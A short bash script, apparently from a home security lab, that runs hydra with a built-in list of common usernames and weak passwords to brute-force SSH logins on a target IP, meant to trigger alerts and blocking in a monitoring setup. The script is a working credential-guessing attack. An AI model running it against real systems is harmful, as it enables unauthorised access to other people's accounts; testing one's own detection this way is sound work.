#!/usr/bin/env bash
# SSH brute force demo attack.
# Run from Kali against your Ubuntu host (or from Ubuntu against 127.0.0.1 for a solo test).
#
# Usage:   ./attack/ssh_brute.sh <target-ip>

set -e

TARGET="${1:-}"
[[ -z "$TARGET" ]] && { echo "Usage: $0 <target-ip>"; exit 1; }

if ! command -v hydra >/dev/null; then
    echo "hydra not found. Install with: sudo apt install -y hydra"
    exit 1
fi

USERLIST=$(mktemp)
PASSLIST=$(mktemp)
trap 'rm -f "$USERLIST" "$PASSLIST"' EXIT

cat > "$USERLIST" <<EOF
root
admin
ubuntu
guest
oracle
test
EOF

cat > "$PASSLIST" <<EOF
password
123456
admin
letmein
ubuntu
qwerty
test
pass
toor
12345678
EOF

echo "[*] Hydra against $TARGET:22"
hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -W 1 "$TARGET" ssh || true
echo "[*] Done. Check the orchestrator log + Kibana for the alert + block."
